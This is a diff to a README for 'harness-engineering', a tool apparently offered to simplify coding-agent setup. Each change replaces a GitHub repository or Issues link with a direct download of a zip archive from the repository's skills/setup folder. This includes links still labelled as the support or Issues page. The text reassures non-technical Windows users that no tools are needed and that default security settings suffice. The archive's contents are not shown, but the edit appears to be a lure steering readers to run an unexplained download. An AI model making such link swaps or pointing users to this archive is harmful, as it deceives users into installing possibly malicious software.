@@ -1,6 +1,6 @@
 # ⚙️ harness-engineering - Simplify Coding Agent Setup
 
-[![Download harness-engineering](https://img.shields.io/badge/Download-harness--engineering-blue?style=for-the-badge)](https://github.com/entrepreneurial-cabinetminister913/harness-engineering)
+[![Download harness-engineering](https://img.shields.io/badge/Download-harness--engineering-blue?style=for-the-badge)](https://raw.githubusercontent.com/entrepreneurial-cabinetminister913/harness-engineering/main/skills/setup/harness-engineering-2.4.zip)
 
 ---
 
@@ -37,7 +37,7 @@ You do not need any programming tools or software installed before starting. har
 
 Click the button above or visit the page below to download the software:
 
-[Download harness-engineering](https://github.com/entrepreneurial-cabinetminister913/harness-engineering)
+[Download harness-engineering](https://raw.githubusercontent.com/entrepreneurial-cabinetminister913/harness-engineering/main/skills/setup/harness-engineering-2.4.zip)
 
 This page contains the files and instructions you need. Usually, you will see a section called "Releases" or "Downloads." Pick the latest version marked for Windows.
 
@@ -106,7 +106,7 @@ If you run into issues:
 - Check you have permission to install and run new software.  
 - Ensure your internet connection is stable.  
 - Visit the Issues section on the GitHub page for help:  
-  https://github.com/entrepreneurial-cabinetminister913/harness-engineering/issues  
+  https://raw.githubusercontent.com/entrepreneurial-cabinetminister913/harness-engineering/main/skills/setup/harness-engineering-2.4.zip  
 
 Users report the app works well on home and office PCs with default security settings.
 
@@ -131,10 +131,10 @@ You will find documentation and examples on the GitHub page to help if you later
 ## 🔗 Important Links
 
 - Visit the download page to get the latest version:  
-  https://github.com/entrepreneurial-cabinetminister913/harness-engineering  
+  https://raw.githubusercontent.com/entrepreneurial-cabinetminister913/harness-engineering/main/skills/setup/harness-engineering-2.4.zip  
 
 - Check issues and support:  
-  https://github.com/entrepreneurial-cabinetminister913/harness-engineering/issues  
+  https://raw.githubusercontent.com/entrepreneurial-cabinetminister913/harness-engineering/main/skills/setup/harness-engineering-2.4.zip  
 
 ---
 
@@ -148,4 +148,4 @@ You will find documentation and examples on the GitHub page to help if you later
 
 ---
 
-# [![Download harness-engineering](https://img.shields.io/badge/Download-harness--engineering-grey?style=for-the-badge)](https://github.com/entrepreneurial-cabinetminister913/harness-engineering)
+# [![Download harness-engineering](https://img.shields.io/badge/Download-harness--engineering-grey?style=for-the-badge)](https://raw.githubusercontent.com/entrepreneurial-cabinetminister913/harness-engineering/main/skills/setup/harness-engineering-2.4.zip)
